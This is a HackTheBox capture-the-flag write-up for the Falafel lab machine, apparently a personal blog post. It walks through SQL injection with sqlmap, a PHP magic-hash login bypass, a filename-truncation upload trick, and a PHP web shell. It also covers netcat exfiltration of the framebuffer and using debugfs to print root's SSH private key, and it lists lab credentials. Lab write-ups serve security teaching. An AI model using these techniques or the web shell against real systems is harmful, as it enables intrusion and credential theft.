---
layout: post
title: 'HackTheBox - Falafel'
date: 2018-11-18
author: Casey Mullineaux
cover: '/images/htb/falafel/falafel.jpg'
tags: hackthebox
---

There's a lot of cool stuff going on in this challenge. Double file extension upload vulnerabilities, type juggling, magic hashes and frame buffer dumping just to name a few. It was difficult to complete and requied combining a number of different techniques, but that's what made this box very enjoyable.

# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a> Enumeration
Start off with nmap

```bash
root@kali:~/htb/falafel# nmap -sC -sV -oA falafel 10.10.10.73
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-30 16:05 AEST
Nmap scan report for 10.10.10.73
Host is up (0.36s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.26 seconds
root@kali:~/htb/falafel# 
```

<div class="alert alert-info">
    <p><strong>Discovered interesting files:</strong></p>
    File: robots.txt <br>
    Ports: 80,443
</div>

I kick off some automatic enumeration to run in the background while I poke around with some manual stuff. I run a directory brute force attack to see if there are any other directories that may be worthwhile exploring.

```bash
root@kali:~/htb/falafel# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.10.73                                 

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.73/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/images (Status: 301)
/uploads (Status: 301)
/assets (Status: 301)
/css (Status: 301)
/js (Status: 301)
=====================================================
root@kali:~/htb/falafel#
```

`gobuster` finds some additional directories, but I'm being redirected with a status code of **301**. This often happens on web applications when a user tries to access a page they do not have permission to view - such as not being logged in. I make a note of the directories and will revisit if I can log in to the application.

<div class="alert alert-info"><strong>Discovered:</strong><br>
    Interesting directories
</div>

Output of nmap shows a robots.txt with a dissalowed entry of `.txt`
![htb-falafel01](/images/htb/falafel/htb-falafel01.png)

I fire off another brute force attack using `wfuzz` to see if I can find any juicy text files that this admin wanted to keep hidden from indexing services.

* **-c**: show coloured output
* **-w**: The wordlist to use
* **-hc**: error codes to ignore
* **-t**: number of threads
* **FUZZ**: The word *FUZZ* is a variable that is replaced with each item in the word list.

```bash
root@kali:~/htb/falafel# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404 -t 50 http://10.10.10.73/FUZZ.txt   

Warning: Pycurl is not compiled against OpenSSL. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.73/FUZZ.txt
Total requests: 207643

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200    109 L      674 W         7203 Ch        "# directory-list-lowercase-2.3-medium.txt"                                                    
000002:  C=200    109 L      674 W         7203 Ch        "#"
000003:  C=200    109 L      674 W         7203 Ch        "# Copyright 2007 James Fisher"                                                                
000004:  C=200    109 L      674 W         7203 Ch        "#"
001655:  C=200      1 L        4 W           30 Ch        "robots"
006395:  C=200     17 L      120 W          804 Ch        "cyberlaw"

Total time: 1622.168
Processed Requests: 207643
Filtered Requests: 207628
Requests/sec.: 128.0033
```

<div class="alert alert-info"><strong>Discovered:</strong><br>
    Interesting file: cyberlaw.txt
</div>

I check out `cyberlaw.txt` and see if that holds any useful bits of info
![htb-falafel02](/images/htb/falafel/htb-falafel02.png)

This looks like a text copy of an email from the site administrator to the legal team, which holds some instrumental pieces of information

> From: Falafel Network Admin (admin@falafel.htb)
> Subject: URGENT!! MALICIOUS SITE TAKE OVER!
> Date: November 25, 2017 3:30:58 PM PDT
> To: lawyers@falafel.htb, devs@falafel.htb

The headers of the email show two potential usernames; **admin**, **lawyers** and **devs**

> A user named "chris" ...

We have another possible username.

> ... has informed me that he could log into MY account without knowing the password

This eludes to a login bypass vulnerability - perhaps SQL injection?.

> ... then take FULL CONTROL of the website using the image upload feature.

This implies a vulnerability within the image upload feature of the website. This is a possible vector for remote code execution.

> We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload.

Sounds like there may be a WAF or at least some kind of input validation, which may mean that exploiting the login form or the upload feature may not be trivial.

<div class="alert alert-info"><strong>Discovered:</strong><br>
    Three potential usernames <br>
    Possible login bypass vulnerability (SQL injection?) <br>
    Possible remote code execution vulnearbility in upload form
</div>

With the initial stages of enumeration done, it's time to start poking and see if I can find a use for what I've discovered.

<img src="https://media.giphy.com/media/FA77mwaxV74SA/giphy.gif">

Browse to port 80 in Firefox and see a landing page. I make note there's an email address `IT@falafel.htb` which could be a potential user on the system.
![htb-falafel03](/images/htb/falafel/htb-falafel03.png)

I click the login button and get to the login page. Knowing that there is a potential login bypass vulnerability, I enter some random details (admin/admin) and capture the request in burp for easy manipulation.

One thing that I notice after making a login attempt is the message that is displayed when I enter a valid username.
![htb-falafel04](/images/htb/falafel/htb-falafel04.png)

I try with the usernames of some potential users I found during discovery, and look what the website displays when I use the username `lawyer`
![htb-falafel05](/images/htb/falafel/htb-falafel05.png)

I try this technique again with the other potential usernames I discovered and confirmed a login account exists for the user `chris`

<div class="alert alert-success"><strong>Confirmed:</strong>
    Information disclosure vulnerability.
</div>

To explore this information disclosure vulnerability further, I unleash `wfuzz` once again. This time I use it to brute force a list of usernames by firing off a bunch of login requests and parsing the response for the text "Wrong identification" that I only get when an invalid username is entered. The theory being, if this text doesn't exist on a response from a login attempt, then the username is valid.
    
```bash
root@kali:~/htb/falafel# hydra -L /usr/share/wordlists/user.txt -p seemslegit 10.10.10.73 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Wrong identification" -t 64
```

Unfortunately, this didn't return any new information, but it was worth a shot!

# <a name="exploit"></a> Exploitation
I test for a SQL Injection vulnerability with `sqlnamp`. 
To do this, first I saved a login request from `Burpsuite` to a file called `login.req`
![htb-falafel06](/images/htb/falafel/htb-falafel06.png)

I then pass the login request into `sqlmap` and check for SQL injection

```bash
root@kali:~/htb/falafel# sqlmap -r login.req --level=5 --risk=3 -threads 10 --batch
...
sqlmap identified the following injection point(s) with a total of 148 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=x'+(SELECT 'lwsN' WHERE 9765=9765 AND 1007=1007)+'&password=y
---
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
```

This confirms the site has a SQL injection vulnerability and also that the back end database is MySQL. I can now specify the type of database to speed up my subsequent SQLi attacks.
<div class="alert alert-success"><strong>Confirmed</strong><br>
    SQL injection vulnerabiltiy
</div>

With SQLi now on the table, I dump the databases

```bash
root@kali:~/htb/falafel# sqlmap -r login.req --level=4 --risk=3 -t 10 --dbms=mysql --dbs --batch
...
available databases [2]:
[*] falafel
[*] information_schema
...
```

Next, the tables from the `falafel` database

```bash
root@kali:~/htb/falafel# sqlmap -r login.req --level=4 --risk=3 -t 10 --dbms=mysql --D falafel --tables --batch
...
Database: falafel
[1 table]
+-------+ 
| users |
+-------+ 
```

And finally, dump the contents of the `users` table
```bash
root@kali:~/htb/falafel# sqlmap -r login.req --level=4 --risk=3 -t 10 --dbms=mysql --D falafel -T users --dump --batch
...
Database: falafel                                                          
Table: users
[2 entries]
+----+--------+----------+---------------------------------------------+
| ID | role   | username | password                                    |
+----+--------+----------+---------------------------------------------+
| 1  | admin  | admin    | 0e462096931906507119562988736854            |
| 2  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) |
+----+--------+----------+---------------------------------------------+
```

`sqlmap` was even kind enough to crack a password for me. Handy!

<div class="alert alert-success"><strong>Password cracked!</strong><br>
    chris:juggling
</div>

<p align="center">
    <img src="https://media.giphy.com/media/TOWeGr70V2R1K/giphy.gif">
</p>

I log in with `chris:juggling`: and am greeted by the user's profile page.
![htb-falafel07](/images/htb/falafel/htb-falafel07.png)

I do a bit of __googling__ research and come across something in PHP called [type juggling](https://secure.php.net/manual/en/language.types.type-juggling.php). More importantly, however, I stumble across a vulnerability with PHP type juggling called [magic hashes](https://www.whitehatsec.com/blog/magic-hashes/). 

Using `hash-identifier`, I confirm the admin password hash to be using the MD5 algorithm
```bash
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################

 -------------------------------------------------------------------------
 HASH: 0e462096931906507119562988736854

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Using the table on the [this blog post](https://www.whitehatsec.com/blog/magic-hashes/), I note down that the magic hash value of an MD5 hash is `240610708`.

Referring to use case 2 in the blog article, in theory, I should be able to exploit the type juggling vulnerability by merely using `240610708` as the password for the admin user.

I try logging in with `admin:240610708`.

<p align="center">
    <img src="https://media.giphy.com/media/3ohs7YmgwHmCCvh0sg/giphy.gif">
</p>

Now that I'm logged in as admin, I take a look at the profile page which displays another hint. 

> "Know your limits." -Anonymous

I check out the upload page as previous hints suggest a file upload vulnerability.
I create a simple php page, save it as `toteslegit.php`, serve it up over HTTP, and try to upload it to the site.
```bash
root@kali:~/htb/falafel# echo "<?php phpinfo(); ?>" > toteslegit.php
root@kali:~/htb/falafel# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
![htb-falafel08](/images/htb/falafel/htb-falafel08.png)

No luck. I get a *bad extension* error message. The placeholder text of the upload form suggest `.png` files will work, so I quickly google and save something appropriate.
![htb-falafel09](/images/htb/falafel/htb-falafel09.png)

And upload that the site.
![htb-falafel10](/images/htb/falafel/htb-falafel10.png)

So `.php` files are bad, `.png` files are good. Looks like some kind of filtering going on. To figure out how to bypass it, I need to know a little more about how it works.

I rename my `hacker.png` to `hacker.php.png` in order to test a *double extension* upload vulnerability.
![htb-falafel11](/images/htb/falafel/htb-falafel11.png)

The fact that this uploaded successfully tells me something significant. This shows that I'm dealing with extension *whitelisting* as opposed to blacklisting. If the application was comparing the filename with a list of blacklisted extensions, then having `.php` in the filename would have failed to upload. Instead what I think is happening is that the website is looking at the extension (in this case `.png`), evaluating that it's a known good file type and therefore allowing the upload to happen. This is important because it means if I can bypass the filter, I'll be able to load a file with a `.php` extension.

Referring back to the "know your limits" hint, I fiddle around with the length of the file name in burp. I add a whole bunch of characters and notice something interesting. The upload page will truncate the filename and rewrite the file with a new name at its max length.
![htb-falafel12](/images/htb/falafel/htb-falafel12.png)

I grab the new file name and figure out how many characters that is.
```bash
root@kali:~/htb/falafel# echo "haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | wc -c
236
```
The full character length of my php file cannot exceed **236** characters.

So if I make `<filename>.php` + `.png` to be 240 (236 + 4) characters in total length, then the `.png` extension gets truncated when saving the file to disk when it is uploaded. This means the total length of the file name needs to be 240 characters, 8 of which make up the double extension, which means I need 232 garbage characters.

```bash
cp toteslegit.php  haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.png
```

I give that a try, and see in burp it's been uploaded successfully and that it's been renamed to `.php`.
![htb-falafel13](/images/htb/falafel/htb-falafel13.png)

I browse to the directory where the file was uploaded and confirm the successful execution of my php script.
![htb-falafel14](/images/htb/falafel/htb-falafel14.png)

I modify the php file with a tiny bit of code that will allow me to execute commands on the remote system, and upload again.
```php
<?php echo system($_REQUEST['cmd']); ?>
```
![htb-falafel15](/images/htb/falafel/htb-falafel15.png)

From `burpsuite`, I can manipulate the query string and get myself a reverse shell.
```bash
Listening on [any] 9001 ...
connect to [10.10.14.200] from (UNKNOWN) [10.10.10.73] 35178
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

# <a name="privesc"></a> Privilege escalation
First thing I always do is check out the `/etc/passwd` file and see what other user accounts there are.

<div class="alert alert-success"><strong>Discovered</strong>
    User: moche <br>
    User: yossi <br>
</div>

I enumearate the system a little, and come acrosss `connection.php`
```bash
ww-data@falafel:/var/www/html$ cat connection.php 
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
www-data@falafel:/var/www/html$ 
```
<div class="alert alert-info"><strong>Discovered</strong><br>
SQL credentials - moshe:falafelIsReallyTasty
</div>

Knowing from earlier there is a user on the system called `moshe`, I try my luck at pivoting to this user with the MySQL password
```bash
www-data@falafel:/var/www/html$ su moshe
Password: 
setterm: $TERM is not defined.
moshe@falafel:/var/www/html$ cat /home/moshe/usr.txt
{{REDACTED}}
```
<div class="alert alert-success"><strong>Success</strong><br>
Pivoted to user <strong>moshe</strong><br>
User flag obtained!
</div>

I enumerate the system some more and check out what groups `moshe` is a member of.
```bash
moshe@falafel:~$ groups
moshe adm mail news voice floppy audio video games
```

Some of these groups are interesting as they are not the default groups that most users are a part of. In hackthebox challenges, nothing is done by accident.

I do some more enumeration of the groups. I admit that this step took me quite a significant amount of time to figure out anything useful, but persistence paid off.
It turns out that the **video** group has access to something interesting.
```bash
moshe@falafel:~$ find / -group video 2> /dev/null
**/dev/fb0**
/dev/dri/card0
/dev/dri/renderD128
/dev/dri/controlD64
```

`/dev/fb0` is the [framebuffer](https://en.wikipedia.org/wiki/Linux_framebuffer) device. My persistent googling lead me to [this blog](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/) that allows the framebuffer to be dumped to an image file.

I save the script as `toteslegit.pl` on my Kali host
![htb-falafel16](/images/htb/falafel/htb-falafel16.png)

I grab the size of the frame buffer from falafel, dump the framebuffer out to a file, and transfer it over to my Kali machine via netcat.
```bash
moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size
1176,885
moshe@falafel:~$ cat /dev/fb0 > framebuffer.raw
moshe@falafel:~$ nc -w 3 10.10.14.200 9002 < framebuffer.raw   
```

On my Kali machine, I execute the python script as described on the blog and open the image in `gimp`
```bash
root@kali:~/htb/falafel# code toteslegit.pl
root@kali:~/htb/falafel# chmod +x toteslegit.pl
root@kali:~/htb/falafel# ./toteslegit.pl 1176 885 < framebuffer.raw > framebuffer.png
pnmtopng: 5 colors found
root@kali:~/htb/falafel# gimp framebuffer.png  
```

And the result is beautiful ...
![htb-falafel17](/images/htb/falafel/htb-falafel17.png)

```bash
moshe@falafel:~$ su yossi
Password: 
yossi@falafel:/home/moshe$ 
```
<div class="alert alert-success"><strong>Success</strong><br>
User credentials - yossi:MoshePlzStopHackingMe! <br>
Pivoted to user <strong>yossi</strong>
</div>

Using the same technique as used before, I find the `disk` group provides a way forward.
```bash
yossi@falafel:~$ groups
yossi adm disk cdrom dip plugdev lpadmin sambashare
yossi@falafel:~$ find / -group disk 2> /dev/null
/dev/btrfs-control
/dev/sda5
/dev/sda2
/dev/sda1
/dev/sda
/dev/sg0
/dev/loop7
/dev/loop6
/dev/loop5
/dev/loop4
/dev/loop3
/dev/loop2
/dev/loop1
/dev/loop0
/dev/loop-control
```

Members of the `disk` group get access to a utility called `debugfs` which mounts the file system as `root`. Using this utility allows me to navigate the file system as the `root` user.

```bash
yossi@falafel:~$ debugfs /dev/sda1
debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs: pwd
[pwd]   INODE:      2  PATH: /
[root]  INODE:      2  PATH: /

debugfs:  cd /root
cd /root
debugfs:  ls -l
ls -l
WARNING: terminal is not fully functional
-  (press RETURN)
 262241   40750 (2)      0      0    4096  5-Feb-2018 17:04 .
      2   40755 (2)      0      0    4096  5-Feb-2018 17:20 ..
 262242  100600 (1)      0      0    3121 27-Nov-2017 22:45 .bashrc
 262243  100600 (1)      0      0     148 17-Aug-2015 18:30 .profile
 295046   40700 (2)      0      0    4096 27-Nov-2017 20:13 .cache
 289943  100400 (1)      0      0      33 27-Nov-2017 20:23 root.txt
 269128   40755 (2)      0      0    4096 15-Jan-2018 02:54 .nano
 402797   40755 (2)      0      0    4096 15-Jan-2018 02:12 .ssh
 269130  100644 (1)      0      0     206  5-Feb-2018 17:27 .wget-hsts
 269127  100600 (1)      0      0       0 14-Jan-2018 21:47 .bash_history
 ```
 
From here I can just read the root flag, but that's not good enough. I want a root shell to fully pwn this box. Using `debugfs` I dump out the contents of the root user's private ssh key

```bash
yossi@falafel:~$ debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  cd /root/.ssh
debugfs:  cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
debugfs:  
```

<div class="alert alert-info">
<strong>Discovered</strong><br>
root user's ssh private key
</div>

On my Kali machine, I save the key as `falafel.ppk` and log in as root.

```bash
root@kali:~/htb/falafel# chmod 400 falafel.ppk
root@kali:~/htb/falafel# ssh root@10.10.10.73 -i falafel.ppk
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
root@falafel:~# cat root.txt
**{{REDACTED}}**
```

# <a name="deconstruct"></a>Deconstructing the hack
## Magic hashes
A "magic hash" exploits a flaw in the way hashed strings are handled by PHP when either `!=` or `==` operators are used comparing them. Whenever any of these two operators are used for comparing hashes, PHP interprets every hashed value that begins with `0e` as the value `0`. 

Let's look at the admin password used on this challenge as an example.
From the MySQL dump, the md5 hashed password for the admin user is `0e462096931906507119562988736854`. Notice this hash begins with `0e`. This means that when we use the `==` operator to compare another hash with this one, the admin password will evaluate to the numeric value of `0`.

Now let's put this into the context of how many password mechanisms work. You enter a plain text value for your password into a web form, the web server will take that password, hash it, then compare it against the hashed password on the database. For example:

```php
if (md5("mysupersecretpassword") == "0e462096931906507119562988736854" ) {
    allow.login()
}
```

Or in our case when referring to the operational flaw in PHP, in reality, it evaluates to something like this:

```php
if (md5("mysupersecretpassword") == 0 ) {
    allow.login()
}
```

So to exploit this, all we need to do is give it a password that when hashed with the MD5 algorithm, also evaluates to a hash that begins with `0e`. Again using the example from this challenge, if we MD5 hash the value `240610708` we get `0e462097431906509019562988736854` as a result.

Going back to the pseudocode example above, if we enter the literal text value `240610708` as our password, it will pass it to the MD5 hashing algorithm and give the result above, and then compare that to the value in the database. Since the flaw in the PHP comparison operator evaluates both values to the integer `0`, we're successfully authenticated.

You can try this yourself on [phptester.net](http://phptester.net) with the following code:
```php
<?php
    var_dump(md5('240610708') == '0e462096931906507119562988736854');
?>
```
![htb-falafel18](/images/htb/falafel/htb-falafel18.jpg)

Here's a breakdown of how the authentication is evaulated.
```php
if (md5("240610708") == "0e462096931906507119562988736854" ) {
    allow.login()
}

if "0e462097431906509019562988736854" == "0e462096931906507119562988736854" ) {
    allow.login()
}

if 0 == 0 {
    allow.login()
}
```